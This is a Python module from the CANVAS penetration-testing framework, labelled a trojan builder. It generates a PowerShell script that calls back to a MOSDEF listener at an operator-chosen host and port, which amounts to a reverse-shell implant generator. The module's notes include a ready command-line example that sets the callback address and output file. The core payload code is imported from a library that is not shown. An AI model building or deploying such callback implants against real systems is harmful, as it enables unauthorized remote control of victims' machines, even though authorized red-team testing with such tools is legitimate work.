#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import time
from exploitutils import *

NAME                = "BuildPowershellCallback"
DESCRIPTION         = "Creates a powershell script that will call back to MOSDEF"

NOTES               = """

This creates the MOSDEF Callback Powershell script which has a hardcoded callback port and IP address.

HTTP MOSDEF is not supported yet. The filename can be anything you like, we suggest something ending in .ps1.


Commandline Example:
exploits/trojan/BuildPowershellCallback/BuildPowershellCallback.py -t 0.0.0.0 -O callback_host:192.168.1.1 -O callback_port:5555 -O filename:pscallback.ps1
"""

DOCUMENTATION          =  {}
DOCUMENTATION["Notes"] = NOTES
VERSION                = "1.0"

PROPERTY               = {}
PROPERTY['TYPE']       = "Trojans"

from libs.canvasos import *
from ExploitTypes.utility import Utility
from Nodes.mosdef_powershell.mosdef_powershell import *
import logging

class theexploit(Utility):
    def __init__(self):
        Utility.__init__(self)
        self.result           = ""
        self.name             = NAME
        self.filename         = "psmosdef.ps1"
        self.callback_host    = None
        self.callback_port    = 5555
        self.OS               = "Windows"
        self.HTTP             = False
        self.SSL              = False
        self.psmosdefcallback = ""

    def getargs(self):
        self.getarg("filename") #output filename
        self.getarg("callback_host")
        self.getarg("callback_port")
        #self.HTTP = int(self.HTTP)
        #self.getarg("SSL")
        #self.SSL = int(self.SSL)

    def run(self):
        self.getargs()
        self.setInfo("%s (in progress)" % (NAME))

        t_os        = canvasos(self.OS)
        # Create the object mosdef_powershell
        ps_mosdef = mosdef_powershell()
        logging.info("Building Powershell MOSDEF Callback Script")

        try:
            ps_mosdef.setup(self.callback_host, self.callback_port, mosdef_type=23, mosdef_id=self.engine.getNewMosdefID(self))
            self.psmosdefcallback = ps_mosdef.createMosdefCallback()

        except Exception, err:
            import traceback
            traceback.print_exc()
            logging.error("Error while building PowerShell callback (%s)" % (err))
            self.setInfo("%s - failed" % (NAME))
            return 0

        if not self.psmosdefcallback:
            logging.error("Got an empty PowerShell callback")
            self.setInfo("%s - failed" % (NAME))
            return 0

        logging.info("Writing out %d bytes to %s" % (len(self.psmosdefcallback), self.filename))
        with open(self.filename, "wb") as f:
            f.write(self.psmosdefcallback)

        self.setInfo("%s - done" % (NAME))
        return len(self.psmosdefcallback) != 0


if __name__=="__main__":
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
